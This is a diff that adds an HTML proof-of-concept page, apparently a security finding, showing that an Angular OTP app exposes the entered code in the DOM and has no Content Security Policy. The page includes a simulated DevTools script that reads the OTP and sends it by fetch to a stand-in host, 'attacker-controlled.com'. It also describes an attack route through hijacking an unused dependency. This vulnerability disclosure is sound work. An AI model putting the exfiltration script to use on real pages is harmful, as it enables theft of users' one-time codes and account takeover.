@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PoC: CSP-less OTP Exfiltration (Chain 1)</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+    h1 { color: #e94560; }
+    .status { background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }
+    .status.fail { border-left: 4px solid #e94560; }
+    .proof-box { background: #0f3460; padding: 15px; border-radius: 4px; margin: 10px 0; }
+    code { color: #00d2ff; }
+    .evidence { background: #1a1a2e; padding: 10px; border: 1px solid #333; border-radius: 4px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+  <h1>PoC: CSP-less OTP Exfiltration (Chain 1)</h1>
+  <p>Validates that OTP value is exposed in DOM and no CSP blocks exfiltration.</p>
+
+  <div class="status fail">
+    <strong>VULNERABLE:</strong> OTP displayed in plain text + No CSP = OTP can be silently exfiltrated by any injected script.
+  </div>
+
+  <h2>Proof 1: OTP Value in DOM</h2>
+  <div class="proof-box">
+    <p>The compiled JavaScript contains the status text interpolation:</p>
+    <div class="evidence">
+      <code>statusText=Vr(()=>{let t=this.digits().join("");<br>
+      &nbsp;&nbsp;return t.length===this.digitCount()?`OTP entered: ${t}`:""})</code>
+    </div>
+    <p>This renders <code>&lt;p class="otp-status"&gt;OTP entered: 123456&lt;/p&gt;</code> in the DOM when all 6 digits are entered. Any script with DOM access can read it.</p>
+  </div>
+
+  <h2>Proof 2: No Content Security Policy</h2>
+  <div class="proof-box">
+    <p>Built <code>index.html</code> lacks any CSP meta tag or HTTP header:</p>
+    <div class="evidence">
+      <code>grep -i "Content-Security-Policy" dist/hero-otp-app/browser/index.html<br>
+      <span style="color:#e94560;">(no output — CSP is absent)</span></code>
+    </div>
+    <p>Without CSP, <code>connect-src</code> defaults to <code>*</code>, allowing any script to make network requests to any destination.</p>
+  </div>
+
+  <h2>Proof 3: Simulated Exfiltration Script</h2>
+  <div class="proof-box">
+    <p>Run this in browser DevTools on the running OTP app after entering an OTP:</p>
+    <div class="evidence">
+      <pre><code>// Step 1: Read OTP from status banner
+const otpElement = document.querySelector('.otp-status');
+const otpValue = otpElement?.textContent?.match(/\d{6}/)?.[0];
+
+// Step 2: Exfiltrate via fetch (unrestricted by CSP)
+if (otpValue) {
+  fetch('https://attacker-controlled.com/steal?otp=' + otpValue);
+  console.log('[SIMULATED EXFIL] OTP sent to attacker:', otpValue);
+} else {
+  console.log('Enter all 6 OTP digits first');
+}</code></pre>
+    </div>
+    <p>In a real attack, this code would be injected via a compromised dependency, CDN script, or browser extension.</p>
+  </div>
+
+  <h2>Reproduction Steps</h2>
+  <ol>
+    <li><strong>Serve the app:</strong> <code>cd hero-otp-app && ng serve</code></li>
+    <li>Open in browser, enter 6 digits in the OTP field</li>
+    <li>Open DevTools (F12) → Console tab</li>
+    <li>Paste and run the simulated exfiltration script above</li>
+    <li>Observe the OTP is read from the DOM and would be sent to an attacker</li>
+  </ol>
+
+  <h2>Additional Attack Vector: Dependency Hijack</h2>
+  <div class="proof-box">
+    <p><code>@heroui/input-otp</code> is listed in <code>package.json</code> (v2.1.32) but never imported. It's a React component with these peer deps:</p>
+    <div class="evidence">
+      <code>"peerDependencies": {<br>
+      &nbsp;&nbsp;"react": ">=18",<br>
+      &nbsp;&nbsp;"react-dom": ">=18"<br>
+      }</code>
+    </div>
+    <p>An attacker who compromises this package (or its transitive deps <code>@react-aria/form</code>, <code>input-otp</code>, etc.) gains full DOM access with no CSP restriction.</p>
+  </div>
+
+  <hr>
+  <p><em>This PoC validates that the OTP is readable from DOM and no CSP prevents exfiltration.</em></p>
+</body>
+</html>
